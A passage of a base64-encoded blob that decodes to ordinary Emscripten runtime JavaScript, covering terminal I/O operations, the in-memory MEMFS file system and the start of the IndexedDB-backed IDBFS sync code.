idWZmZXJbb2Zmc2V0K2ldKX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfX1pZihsZW5ndGgpe3N0cmVhbS5ub2RlLnRpbWVzdGFtcD1EYXRlLm5vdygpfXJldHVybiBpfSl9LGRlZmF1bHRfdHR5X29wczp7Z2V0X2NoYXI6KGZ1bmN0aW9uKHR0eSl7aWYoIXR0eS5pbnB1dC5sZW5ndGgpe3ZhciByZXN1bHQ9bnVsbDtpZihFTlZJUk9OTUVOVF9JU19OT0RFKXt2YXIgQlVGU0laRT0yNTY7dmFyIGJ1Zj1uZXcgQnVmZmVyKEJVRlNJWkUpO3ZhciBieXRlc1JlYWQ9MDt2YXIgaXNQb3NpeFBsYXRmb3JtPXByb2Nlc3MucGxhdGZvcm0hPSJ3aW4zMiI7dmFyIGZkPXByb2Nlc3Muc3RkaW4uZmQ7aWYoaXNQb3NpeFBsYXRmb3JtKXt2YXIgdXNpbmdEZXZpY2U9ZmFsc2U7dHJ5e2ZkPWZzLm9wZW5TeW5jKCIvZGV2L3N0ZGluIiwiciIpO3VzaW5nRGV2aWNlPXRydWV9Y2F0Y2goZSl7fX10cnl7Ynl0ZXNSZWFkPWZzLnJlYWRTeW5jKGZkLGJ1ZiwwLEJVRlNJWkUsbnVsbCl9Y2F0Y2goZSl7aWYoZS50b1N0cmluZygpLmluZGV4T2YoIkVPRiIpIT0tMSlieXRlc1JlYWQ9MDtlbHNlIHRocm93IGV9aWYodXNpbmdEZXZpY2Upe2ZzLmNsb3NlU3luYyhmZCl9aWYoYnl0ZXNSZWFkPjApe3Jlc3VsdD1idWYuc2xpY2UoMCxieXRlc1JlYWQpLnRvU3RyaW5nKCJ1dGYtOCIpfWVsc2V7cmVzdWx0PW51bGx9fWVsc2UgaWYodHlwZW9mIHdpbmRvdyE9InVuZGVmaW5lZCImJnR5cGVvZiB3aW5kb3cucHJvbXB0PT0iZnVuY3Rpb24iKXtyZXN1bHQ9d2luZG93LnByb21wdCgiSW5wdXQ6ICIpO2lmKHJlc3VsdCE9PW51bGwpe3Jlc3VsdCs9IlxcbiJ9fWVsc2UgaWYodHlwZW9mIHJlYWRsaW5lPT0iZnVuY3Rpb24iKXtyZXN1bHQ9cmVhZGxpbmUoKTtpZihyZXN1bHQhPT1udWxsKXtyZXN1bHQrPSJcXG4ifX1pZighcmVzdWx0KXtyZXR1cm4gbnVsbH10dHkuaW5wdXQ9aW50QXJyYXlGcm9tU3RyaW5nKHJlc3VsdCx0cnVlKX1yZXR1cm4gdHR5LmlucHV0LnNoaWZ0KCl9KSxwdXRfY2hhcjooZnVuY3Rpb24odHR5LHZhbCl7aWYodmFsPT09bnVsbHx8dmFsPT09MTApe01vZHVsZVsicHJpbnQiXShVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LDApKTt0dHkub3V0cHV0PVtdfWVsc2V7aWYodmFsIT0wKXR0eS5vdXRwdXQucHVzaCh2YWwpfX0pLGZsdXNoOihmdW5jdGlvbih0dHkpe2lmKHR0eS5vdXRwdXQmJnR0eS5vdXRwdXQubGVuZ3RoPjApe01vZHVsZVsicHJpbnQiXShVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LDApKTt0dHkub3V0cHV0PVtdfX0pfSxkZWZhdWx0X3R0eTFfb3BzOntwdXRfY2hhcjooZnVuY3Rpb24odHR5LHZhbCl7aWYodmFsPT09bnVsbHx8dmFsPT09MTApe01vZHVsZVsicHJpbnRFcnIiXShVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LDApKTt0dHkub3V0cHV0PVtdfWVsc2V7aWYodmFsIT0wKXR0eS5vdXRwdXQucHVzaCh2YWwpfX0pLGZsdXNoOihmdW5jdGlvbih0dHkpe2lmKHR0eS5vdXRwdXQmJnR0eS5vdXRwdXQubGVuZ3RoPjApe01vZHVsZVsicHJpbnRFcnIiXShVVEY4QXJyYXlUb1N0cmluZyh0dHkub3V0cHV0LDApKTt0dHkub3V0cHV0PVtdfX0pfX07dmFyIE1FTUZTPXtvcHNfdGFibGU6bnVsbCxtb3VudDooZnVuY3Rpb24obW91bnQpe3JldHVybiBNRU1GUy5jcmVhdGVOb2RlKG51bGwsIi8iLDE2Mzg0fDUxMSwwKX0pLGNyZWF0ZU5vZGU6KGZ1bmN0aW9uKHBhcmVudCxuYW1lLG1vZGUsZGV2KXtpZihGUy5pc0Jsa2Rldihtb2RlKXx8RlMuaXNGSUZPKG1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9aWYoIU1FTUZTLm9wc190YWJsZSl7TUVNRlMub3BzX3RhYmxlPXtkaXI6e25vZGU6e2dldGF0dHI6TUVNRlMubm9kZV9vcHMuZ2V0YXR0cixzZXRhdHRyOk1FTUZTLm5vZGVfb3BzLnNldGF0dHIsbG9va3VwOk1FTUZTLm5vZGVfb3BzLmxvb2t1cCxta25vZDpNRU1GUy5ub2RlX29wcy5ta25vZCxyZW5hbWU6TUVNRlMubm9kZV9vcHMucmVuYW1lLHVubGluazpNRU1GUy5ub2RlX29wcy51bmxpbmsscm1kaXI6TUVNRlMubm9kZV9vcHMucm1kaXIscmVhZGRpcjpNRU1GUy5ub2RlX29wcy5yZWFkZGlyLHN5bWxpbms6TUVNRlMubm9kZV9vcHMuc3ltbGlua30sc3RyZWFtOntsbHNlZWs6TUVNRlMuc3RyZWFtX29wcy5sbHNlZWt9fSxmaWxlOntub2RlOntnZXRhdHRyOk1FTUZTLm5vZGVfb3BzLmdldGF0dHIsc2V0YXR0cjpNRU1GUy5ub2RlX29wcy5zZXRhdHRyfSxzdHJlYW06e2xsc2VlazpNRU1GUy5zdHJlYW1fb3BzLmxsc2VlayxyZWFkOk1FTUZTLnN0cmVhbV9vcHMucmVhZCx3cml0ZTpNRU1GUy5zdHJlYW1fb3BzLndyaXRlLGFsbG9jYXRlOk1FTUZTLnN0cmVhbV9vcHMuYWxsb2NhdGUsbW1hcDpNRU1GUy5zdHJlYW1fb3BzLm1tYXAsbXN5bmM6TUVNRlMuc3RyZWFtX29wcy5tc3luY319LGxpbms6e25vZGU6e2dldGF0dHI6TUVNRlMubm9kZV9vcHMuZ2V0YXR0cixzZXRhdHRyOk1FTUZTLm5vZGVfb3BzLnNldGF0dHIscmVhZGxpbms6TUVNRlMubm9kZV9vcHMucmVhZGxpbmt9LHN0cmVhbTp7fX0sY2hyZGV2Ontub2RlOntnZXRhdHRyOk1FTUZTLm5vZGVfb3BzLmdldGF0dHIsc2V0YXR0cjpNRU1GUy5ub2RlX29wcy5zZXRhdHRyfSxzdHJlYW06RlMuY2hyZGV2X3N0cmVhbV9vcHN9fX12YXIgbm9kZT1GUy5jcmVhdGVOb2RlKHBhcmVudCxuYW1lLG1vZGUsZGV2KTtpZihGUy5pc0Rpcihub2RlLm1vZGUpKXtub2RlLm5vZGVfb3BzPU1FTUZTLm9wc190YWJsZS5kaXIubm9kZTtub2RlLnN0cmVhbV9vcHM9TUVNRlMub3BzX3RhYmxlLmRpci5zdHJlYW07bm9kZS5jb250ZW50cz17fX1lbHNlIGlmKEZTLmlzRmlsZShub2RlLm1vZGUpKXtub2RlLm5vZGVfb3BzPU1FTUZTLm9wc190YWJsZS5maWxlLm5vZGU7bm9kZS5zdHJlYW1fb3BzPU1FTUZTLm9wc190YWJsZS5maWxlLnN0cmVhbTtub2RlLnVzZWRCeXRlcz0wO25vZGUuY29udGVudHM9bnVsbH1lbHNlIGlmKEZTLmlzTGluayhub2RlLm1vZGUpKXtub2RlLm5vZGVfb3BzPU1FTUZTLm9wc190YWJsZS5saW5rLm5vZGU7bm9kZS5zdHJlYW1fb3BzPU1FTUZTLm9wc190YWJsZS5saW5rLnN0cmVhbX1lbHNlIGlmKEZTLmlzQ2hyZGV2KG5vZGUubW9kZSkpe25vZGUubm9kZV9vcHM9TUVNRlMub3BzX3RhYmxlLmNocmRldi5ub2RlO25vZGUuc3RyZWFtX29wcz1NRU1GUy5vcHNfdGFibGUuY2hyZGV2LnN0cmVhbX1ub2RlLnRpbWVzdGFtcD1EYXRlLm5vdygpO2lmKHBhcmVudCl7cGFyZW50LmNvbnRlbnRzW25hbWVdPW5vZGV9cmV0dXJuIG5vZGV9KSxnZXRGaWxlRGF0YUFzUmVndWxhckFycmF5OihmdW5jdGlvbihub2RlKXtpZihub2RlLmNvbnRlbnRzJiZub2RlLmNvbnRlbnRzLnN1YmFycmF5KXt2YXIgYXJyPVtdO2Zvcih2YXIgaT0wO2k8bm9kZS51c2VkQnl0ZXM7KytpKWFyci5wdXNoKG5vZGUuY29udGVudHNbaV0pO3JldHVybiBhcnJ9cmV0dXJuIG5vZGUuY29udGVudHN9KSxnZXRGaWxlRGF0YUFzVHlwZWRBcnJheTooZnVuY3Rpb24obm9kZSl7aWYoIW5vZGUuY29udGVudHMpcmV0dXJuIG5ldyBVaW50OEFycmF5O2lmKG5vZGUuY29udGVudHMuc3ViYXJyYXkpcmV0dXJuIG5vZGUuY29udGVudHMuc3ViYXJyYXkoMCxub2RlLnVzZWRCeXRlcyk7cmV0dXJuIG5ldyBVaW50OEFycmF5KG5vZGUuY29udGVudHMpfSksZXhwYW5kRmlsZVN0b3JhZ2U6KGZ1bmN0aW9uKG5vZGUsbmV3Q2FwYWNpdHkpe2lmKG5vZGUuY29udGVudHMmJm5vZGUuY29udGVudHMuc3ViYXJyYXkmJm5ld0NhcGFjaXR5Pm5vZGUuY29udGVudHMubGVuZ3RoKXtub2RlLmNvbnRlbnRzPU1FTUZTLmdldEZpbGVEYXRhQXNSZWd1bGFyQXJyYXkobm9kZSk7bm9kZS51c2VkQnl0ZXM9bm9kZS5jb250ZW50cy5sZW5ndGh9aWYoIW5vZGUuY29udGVudHN8fG5vZGUuY29udGVudHMuc3ViYXJyYXkpe3ZhciBwcmV2Q2FwYWNpdHk9bm9kZS5jb250ZW50cz9ub2RlLmNvbnRlbnRzLmxlbmd0aDowO2lmKHByZXZDYXBhY2l0eT49bmV3Q2FwYWNpdHkpcmV0dXJuO3ZhciBDQVBBQ0lUWV9ET1VCTElOR19NQVg9MTAyNCoxMDI0O25ld0NhcGFjaXR5PU1hdGgubWF4KG5ld0NhcGFjaXR5LHByZXZDYXBhY2l0eSoocHJldkNhcGFjaXR5PENBUEFDSVRZX0RPVUJMSU5HX01BWD8yOjEuMTI1KXwwKTtpZihwcmV2Q2FwYWNpdHkhPTApbmV3Q2FwYWNpdHk9TWF0aC5tYXgobmV3Q2FwYWNpdHksMjU2KTt2YXIgb2xkQ29udGVudHM9bm9kZS5jb250ZW50cztub2RlLmNvbnRlbnRzPW5ldyBVaW50OEFycmF5KG5ld0NhcGFjaXR5KTtpZihub2RlLnVzZWRCeXRlcz4wKW5vZGUuY29udGVudHMuc2V0KG9sZENvbnRlbnRzLnN1YmFycmF5KDAsbm9kZS51c2VkQnl0ZXMpLDApO3JldHVybn1pZighbm9kZS5jb250ZW50cyYmbmV3Q2FwYWNpdHk+MClub2RlLmNvbnRlbnRzPVtdO3doaWxlKG5vZGUuY29udGVudHMubGVuZ3RoPG5ld0NhcGFjaXR5KW5vZGUuY29udGVudHMucHVzaCgwKX0pLHJlc2l6ZUZpbGVTdG9yYWdlOihmdW5jdGlvbihub2RlLG5ld1NpemUpe2lmKG5vZGUudXNlZEJ5dGVzPT1uZXdTaXplKXJldHVybjtpZihuZXdTaXplPT0wKXtub2RlLmNvbnRlbnRzPW51bGw7bm9kZS51c2VkQnl0ZXM9MDtyZXR1cm59aWYoIW5vZGUuY29udGVudHN8fG5vZGUuY29udGVudHMuc3ViYXJyYXkpe3ZhciBvbGRDb250ZW50cz1ub2RlLmNvbnRlbnRzO25vZGUuY29udGVudHM9bmV3IFVpbnQ4QXJyYXkobmV3IEFycmF5QnVmZmVyKG5ld1NpemUpKTtpZihvbGRDb250ZW50cyl7bm9kZS5jb250ZW50cy5zZXQob2xkQ29udGVudHMuc3ViYXJyYXkoMCxNYXRoLm1pbihuZXdTaXplLG5vZGUudXNlZEJ5dGVzKSkpfW5vZGUudXNlZEJ5dGVzPW5ld1NpemU7cmV0dXJufWlmKCFub2RlLmNvbnRlbnRzKW5vZGUuY29udGVudHM9W107aWYobm9kZS5jb250ZW50cy5sZW5ndGg+bmV3U2l6ZSlub2RlLmNvbnRlbnRzLmxlbmd0aD1uZXdTaXplO2Vsc2Ugd2hpbGUobm9kZS5jb250ZW50cy5sZW5ndGg8bmV3U2l6ZSlub2RlLmNvbnRlbnRzLnB1c2goMCk7bm9kZS51c2VkQnl0ZXM9bmV3U2l6ZX0pLG5vZGVfb3BzOntnZXRhdHRyOihmdW5jdGlvbihub2RlKXt2YXIgYXR0cj17fTthdHRyLmRldj1GUy5pc0NocmRldihub2RlLm1vZGUpP25vZGUuaWQ6MTthdHRyLmlubz1ub2RlLmlkO2F0dHIubW9kZT1ub2RlLm1vZGU7YXR0ci5ubGluaz0xO2F0dHIudWlkPTA7YXR0ci5naWQ9MDthdHRyLnJkZXY9bm9kZS5yZGV2O2lmKEZTLmlzRGlyKG5vZGUubW9kZSkpe2F0dHIuc2l6ZT00MDk2fWVsc2UgaWYoRlMuaXNGaWxlKG5vZGUubW9kZSkpe2F0dHIuc2l6ZT1ub2RlLnVzZWRCeXRlc31lbHNlIGlmKEZTLmlzTGluayhub2RlLm1vZGUpKXthdHRyLnNpemU9bm9kZS5saW5rLmxlbmd0aH1lbHNle2F0dHIuc2l6ZT0wfWF0dHIuYXRpbWU9bmV3IERhdGUobm9kZS50aW1lc3RhbXApO2F0dHIubXRpbWU9bmV3IERhdGUobm9kZS50aW1lc3RhbXApO2F0dHIuY3RpbWU9bmV3IERhdGUobm9kZS50aW1lc3RhbXApO2F0dHIuYmxrc2l6ZT00MDk2O2F0dHIuYmxvY2tzPU1hdGguY2VpbChhdHRyLnNpemUvYXR0ci5ibGtzaXplKTtyZXR1cm4gYXR0cn0pLHNldGF0dHI6KGZ1bmN0aW9uKG5vZGUsYXR0cil7aWYoYXR0ci5tb2RlIT09dW5kZWZpbmVkKXtub2RlLm1vZGU9YXR0ci5tb2RlfWlmKGF0dHIudGltZXN0YW1wIT09dW5kZWZpbmVkKXtub2RlLnRpbWVzdGFtcD1hdHRyLnRpbWVzdGFtcH1pZihhdHRyLnNpemUhPT11bmRlZmluZWQpe01FTUZTLnJlc2l6ZUZpbGVTdG9yYWdlKG5vZGUsYXR0ci5zaXplKX19KSxsb29rdXA6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt0aHJvdyBGUy5nZW5lcmljRXJyb3JzW0VSUk5PX0NPREVTLkVOT0VOVF19KSxta25vZDooZnVuY3Rpb24ocGFyZW50LG5hbWUsbW9kZSxkZXYpe3JldHVybiBNRU1GUy5jcmVhdGVOb2RlKHBhcmVudCxuYW1lLG1vZGUsZGV2KX0pLHJlbmFtZTooZnVuY3Rpb24ob2xkX25vZGUsbmV3X2RpcixuZXdfbmFtZSl7aWYoRlMuaXNEaXIob2xkX25vZGUubW9kZSkpe3ZhciBuZXdfbm9kZTt0cnl7bmV3X25vZGU9RlMubG9va3VwTm9kZShuZXdfZGlyLG5ld19uYW1lKX1jYXRjaChlKXt9aWYobmV3X25vZGUpe2Zvcih2YXIgaSBpbiBuZXdfbm9kZS5jb250ZW50cyl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVEVNUFRZKX19fWRlbGV0ZSBvbGRfbm9kZS5wYXJlbnQuY29udGVudHNbb2xkX25vZGUubmFtZV07b2xkX25vZGUubmFtZT1uZXdfbmFtZTtuZXdfZGlyLmNvbnRlbnRzW25ld19uYW1lXT1vbGRfbm9kZTtvbGRfbm9kZS5wYXJlbnQ9bmV3X2Rpcn0pLHVubGluazooZnVuY3Rpb24ocGFyZW50LG5hbWUpe2RlbGV0ZSBwYXJlbnQuY29udGVudHNbbmFtZV19KSxybWRpcjooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3ZhciBub2RlPUZTLmxvb2t1cE5vZGUocGFyZW50LG5hbWUpO2Zvcih2YXIgaSBpbiBub2RlLmNvbnRlbnRzKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URU1QVFkpfWRlbGV0ZSBwYXJlbnQuY29udGVudHNbbmFtZV19KSxyZWFkZGlyOihmdW5jdGlvbihub2RlKXt2YXIgZW50cmllcz1bIi4iLCIuLiJdO2Zvcih2YXIga2V5IGluIG5vZGUuY29udGVudHMpe2lmKCFub2RlLmNvbnRlbnRzLmhhc093blByb3BlcnR5KGtleSkpe2NvbnRpbnVlfWVudHJpZXMucHVzaChrZXkpfXJldHVybiBlbnRyaWVzfSksc3ltbGluazooZnVuY3Rpb24ocGFyZW50LG5ld25hbWUsb2xkcGF0aCl7dmFyIG5vZGU9TUVNRlMuY3JlYXRlTm9kZShwYXJlbnQsbmV3bmFtZSw1MTF8NDA5NjAsMCk7bm9kZS5saW5rPW9sZHBhdGg7cmV0dXJuIG5vZGV9KSxyZWFkbGluazooZnVuY3Rpb24obm9kZSl7aWYoIUZTLmlzTGluayhub2RlLm1vZGUpKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpfXJldHVybiBub2RlLmxpbmt9KX0sc3RyZWFtX29wczp7cmVhZDooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLHBvc2l0aW9uKXt2YXIgY29udGVudHM9c3RyZWFtLm5vZGUuY29udGVudHM7aWYocG9zaXRpb24+PXN0cmVhbS5ub2RlLnVzZWRCeXRlcylyZXR1cm4gMDt2YXIgc2l6ZT1NYXRoLm1pbihzdHJlYW0ubm9kZS51c2VkQnl0ZXMtcG9zaXRpb24sbGVuZ3RoKTthc3NlcnQoc2l6ZT49MCk7aWYoc2l6ZT44JiZjb250ZW50cy5zdWJhcnJheSl7YnVmZmVyLnNldChjb250ZW50cy5zdWJhcnJheShwb3NpdGlvbixwb3NpdGlvbitzaXplKSxvZmZzZXQpfWVsc2V7Zm9yKHZhciBpPTA7aTxzaXplO2krKylidWZmZXJbb2Zmc2V0K2ldPWNvbnRlbnRzW3Bvc2l0aW9uK2ldfXJldHVybiBzaXplfSksd3JpdGU6KGZ1bmN0aW9uKHN0cmVhbSxidWZmZXIsb2Zmc2V0LGxlbmd0aCxwb3NpdGlvbixjYW5Pd24pe2lmKCFsZW5ndGgpcmV0dXJuIDA7dmFyIG5vZGU9c3RyZWFtLm5vZGU7bm9kZS50aW1lc3RhbXA9RGF0ZS5ub3coKTtpZihidWZmZXIuc3ViYXJyYXkmJighbm9kZS5jb250ZW50c3x8bm9kZS5jb250ZW50cy5zdWJhcnJheSkpe2lmKGNhbk93bil7bm9kZS5jb250ZW50cz1idWZmZXIuc3ViYXJyYXkob2Zmc2V0LG9mZnNldCtsZW5ndGgpO25vZGUudXNlZEJ5dGVzPWxlbmd0aDtyZXR1cm4gbGVuZ3RofWVsc2UgaWYobm9kZS51c2VkQnl0ZXM9PT0wJiZwb3NpdGlvbj09PTApe25vZGUuY29udGVudHM9bmV3IFVpbnQ4QXJyYXkoYnVmZmVyLnN1YmFycmF5KG9mZnNldCxvZmZzZXQrbGVuZ3RoKSk7bm9kZS51c2VkQnl0ZXM9bGVuZ3RoO3JldHVybiBsZW5ndGh9ZWxzZSBpZihwb3NpdGlvbitsZW5ndGg8PW5vZGUudXNlZEJ5dGVzKXtub2RlLmNvbnRlbnRzLnNldChidWZmZXIuc3ViYXJyYXkob2Zmc2V0LG9mZnNldCtsZW5ndGgpLHBvc2l0aW9uKTtyZXR1cm4gbGVuZ3RofX1NRU1GUy5leHBhbmRGaWxlU3RvcmFnZShub2RlLHBvc2l0aW9uK2xlbmd0aCk7aWYobm9kZS5jb250ZW50cy5zdWJhcnJheSYmYnVmZmVyLnN1YmFycmF5KW5vZGUuY29udGVudHMuc2V0KGJ1ZmZlci5zdWJhcnJheShvZmZzZXQsb2Zmc2V0K2xlbmd0aCkscG9zaXRpb24pO2Vsc2V7Zm9yKHZhciBpPTA7aTxsZW5ndGg7aSsrKXtub2RlLmNvbnRlbnRzW3Bvc2l0aW9uK2ldPWJ1ZmZlcltvZmZzZXQraV19fW5vZGUudXNlZEJ5dGVzPU1hdGgubWF4KG5vZGUudXNlZEJ5dGVzLHBvc2l0aW9uK2xlbmd0aCk7cmV0dXJuIGxlbmd0aH0pLGxsc2VlazooZnVuY3Rpb24oc3RyZWFtLG9mZnNldCx3aGVuY2Upe3ZhciBwb3NpdGlvbj1vZmZzZXQ7aWYod2hlbmNlPT09MSl7cG9zaXRpb24rPXN0cmVhbS5wb3NpdGlvbn1lbHNlIGlmKHdoZW5jZT09PTIpe2lmKEZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSl7cG9zaXRpb24rPXN0cmVhbS5ub2RlLnVzZWRCeXRlc319aWYocG9zaXRpb248MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1yZXR1cm4gcG9zaXRpb259KSxhbGxvY2F0ZTooZnVuY3Rpb24oc3RyZWFtLG9mZnNldCxsZW5ndGgpe01FTUZTLmV4cGFuZEZpbGVTdG9yYWdlKHN0cmVhbS5ub2RlLG9mZnNldCtsZW5ndGgpO3N0cmVhbS5ub2RlLnVzZWRCeXRlcz1NYXRoLm1heChzdHJlYW0ubm9kZS51c2VkQnl0ZXMsb2Zmc2V0K2xlbmd0aCl9KSxtbWFwOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zaXRpb24scHJvdCxmbGFncyl7aWYoIUZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKX12YXIgcHRyO3ZhciBhbGxvY2F0ZWQ7dmFyIGNvbnRlbnRzPXN0cmVhbS5ub2RlLmNvbnRlbnRzO2lmKCEoZmxhZ3MmMikmJihjb250ZW50cy5idWZmZXI9PT1idWZmZXJ8fGNvbnRlbnRzLmJ1ZmZlcj09PWJ1ZmZlci5idWZmZXIpKXthbGxvY2F0ZWQ9ZmFsc2U7cHRyPWNvbnRlbnRzLmJ5dGVPZmZzZXR9ZWxzZXtpZihwb3NpdGlvbj4wfHxwb3NpdGlvbitsZW5ndGg8c3RyZWFtLm5vZGUudXNlZEJ5dGVzKXtpZihjb250ZW50cy5zdWJhcnJheSl7Y29udGVudHM9Y29udGVudHMuc3ViYXJyYXkocG9zaXRpb24scG9zaXRpb24rbGVuZ3RoKX1lbHNle2NvbnRlbnRzPUFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGNvbnRlbnRzLHBvc2l0aW9uLHBvc2l0aW9uK2xlbmd0aCl9fWFsbG9jYXRlZD10cnVlO3B0cj1fbWFsbG9jKGxlbmd0aCk7aWYoIXB0cil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PTUVNKX1idWZmZXIuc2V0KGNvbnRlbnRzLHB0cil9cmV0dXJue3B0cjpwdHIsYWxsb2NhdGVkOmFsbG9jYXRlZH19KSxtc3luYzooZnVuY3Rpb24oc3RyZWFtLGJ1ZmZlcixvZmZzZXQsbGVuZ3RoLG1tYXBGbGFncyl7aWYoIUZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKX1pZihtbWFwRmxhZ3MmMil7cmV0dXJuIDB9dmFyIGJ5dGVzV3JpdHRlbj1NRU1GUy5zdHJlYW1fb3BzLndyaXRlKHN0cmVhbSxidWZmZXIsMCxsZW5ndGgsb2Zmc2V0LGZhbHNlKTtyZXR1cm4gMH0pfX07dmFyIElEQkZTPXtkYnM6e30saW5kZXhlZERCOihmdW5jdGlvbigpe2lmKHR5cGVvZiBpbmRleGVkREIhPT0idW5kZWZpbmVkIilyZXR1cm4gaW5kZXhlZERCO3ZhciByZXQ9bnVsbDtpZih0eXBlb2Ygd2luZG93PT09Im9iamVjdCIpcmV0PXdpbmRvdy5pbmRleGVkREJ8fHdpbmRvdy5tb3pJbmRleGVkREJ8fHdpbmRvdy53ZWJraXRJbmRleGVkREJ8fHdpbmRvdy5tc0luZGV4ZWREQjthc3NlcnQocmV0LCJJREJGUyB1c2VkLCBidXQgaW5kZXhlZERCIG5vdCBzdXBwb3J0ZWQiKTtyZXR1cm4gcmV0fSksREJfVkVSU0lPTjoyMSxEQl9TVE9SRV9OQU1FOiJGSUxFX0RBVEEiLG1vdW50OihmdW5jdGlvbihtb3VudCl7cmV0dXJuIE1FTUZTLm1vdW50LmFwcGx5KG51bGwsYXJndW1lbnRzKX0pLHN5bmNmczooZnVuY3Rpb24obW91bnQscG9wdWxhdGUsY2FsbGJhY2spe0lEQkZTLmdldExvY2FsU2V0KG1vdW50LChmdW5jdGlvbihlcnIsbG9jYWwpe2lmKGVycilyZXR1cm4gY2FsbGJhY2soZXJyKTtJREJGUy5nZXRSZW1vdGVTZXQobW91bnQsKGZ1bmN0aW9uKGVycixyZW1vdGUpe2lmKGVycilyZXR1cm4gY2FsbGJhY2soZXJyKTt2YXIgc3JjPXBvcHVsYXRlP3JlbW90ZTpsb2NhbDt2YXIgZHN0PXBvcHVsYXRlP2xvY2FsOnJlbW90ZTtJREJGUy5yZWNvbmNpbGUoc3JjLGRzdCxjYWxsYmFjayl9KSl9KSl9KSxnZXREQjooZnVuY3Rpb24obmFtZSxjYWxsYmFjayl7dmFyIGRiPUlEQkZTLmRic1tuYW1lXTtpZihkYil7cmV0dXJuIGNhbGxiYWNrKG51bGwsZGIpfXZhciByZXE7dHJ5e3JlcT1JREJGUy5pbmRleGVkREIoKS5vcGVuKG5hbWUsSURCRlMuREJfVkVSU0lPTil9Y2F0Y2goZSl7cmV0dXJuIGNhbGxiYWNrKGUpfWlmKCFyZXEpe3JldHVybiBjYWxsYmFjaygiVW5hYmxlIHRvIGNvbm5lY3QgdG8gSW5kZXhlZERCIil9cmVxLm9udXBncmFkZW5lZWRlZD0oZnVuY3Rpb24oZSl7dmFyIGRiPWUudGFyZ2V0LnJlc3VsdDt2YXIgdHJhbnNhY3Rpb249ZS50YXJnZXQudHJhbnNhY3Rpb247dmFyIGZpbGVTdG9yZTtpZihkYi5vYmplY3RTdG9yZU5hbWVzLmNvbnRhaW5zKElEQkZTLkRCX1NUT1JFX05BTUUpKXtmaWxlU3RvcmU9dHJhbnNhY3Rpb24ub2JqZWN0U3RvcmUoSURCRlMuREJfU1RPUkVfTkFNRSl9ZWxzZXtmaWxlU3RvcmU9ZGIuY3JlYXRlT2JqZWN0U3RvcmUoSURCRlMuREJfU1RPUkVfTkFNRSl9aWYoIWZpbGVTdG9yZS5pbmRleE5hbWVzLmNvbnRhaW5zKCJ0aW1lc3RhbXAiKSl7ZmlsZVN0b3JlLmNyZWF0ZUluZGV4KCJ0aW1lc3RhbXAiLCJ0aW1lc3RhbXAiLHt1bmlxdWU6ZmFsc2V9KX19KTtyZXEub25zdWNjZXNzPShmdW5jdGlvbigpe2RiPXJlcS5yZXN1bHQ7SURCRlMuZGJzW25hbWVdPWRiO2NhbGxiYWNrKG51bGwsZGIpfSk7cmVxLm9uZXJyb3I9KGZ1bmN0aW9uKGUpe2NhbGxiYWNrKHRoaXMuZXJyb3IpO2UucHJldmVudERlZmF1bHQoKX0pfSksZ2V0TG9jYWxTZXQ6KGZ1bmN0aW9uKG1vdW50LGNhbGxiYWNrKXt2YXIgZW50cmllcz17fTtmdW5jdGlvbiBpc1JlYWxEaXIocCl7cmV0dXJuIHAhPT0iLiImJnAhPT0iLi4ifWZ1bmN0aW9uIHRvQWJzb2x1dGUocm9vdCl7cmV0dXJuKGZ1bmN0aW9uKHApe3JldHVybiBQQVRILmpvaW4yKHJvb3QscCl9KX12YXIgY2hlY2s9RlMucmVhZGRpcihtb3VudC5tb3VudHBvaW50KS5maWx0ZXIoaXNSZWFsRGlyKS5tYXAodG9BYnNvbHV0ZShtb3VudC5tb3VudHBvaW50KSk7d2hpbGUoY2hlY2subGVuZ3RoKXt2YXIgcGF0aD1jaGVjay5wb3AoKTt2YXIgc3RhdDt0cnl7c3RhdD1GUy5zdGF0KHBhdGgpfWNhdGNoKGUpe3JldHVybiBjYWxsYmFjayhlKX1pZihGUy5pc0RpcihzdGF0Lm1vZGUpKXtjaGVjay5wdXNoLmFwcGx5KGNoZWNrLEZTLnJlYWRkaXIocGF0aCkuZmlsdGVyKGlzUmVhbERpcikubWFwKHRvQWJzb2x1dGUocGF0aCkpKX1lbnRyaWVzW3BhdGhdPXt0aW1lc3RhbXA6c3RhdC5tdGltZX19cmV0dXJuIGNhbGxiYWNrKG51bGwse3R5cGU6ImxvY2FsIixlbnRyaWVzOmVudHJpZXN9KX0pLGdldFJlbW90ZVNldDooZnVuY3Rpb24obW91bnQsY2FsbGJhY2spe3ZhciBlbnRyaWVzPXt9O0lEQkZTLmdldERCKG1vdW50Lm1vdW50cG9pbnQsKGZ1bmN0aW9uKGVycixkYil7aWYoZXJyKXJldHVybiBjYWxsYmFjayhlcnIpO3ZhciB0cmFuc2FjdGlvbj1kYi50cmFuc2FjdGlvbihbSURCRlMuREJfU1RPUkVfTkFNRV0sInJlYWRvbmx5Iik7dHJhbnNhY3Rpb24ub25lcnJvcj0oZnVuY3Rpb24oZSl7Y2FsbGJhY2sodGhpcy5lcnJvcik7ZS5wcmV2ZW50RGVmYXVsdCgpfSk7dmFyIHN0b3J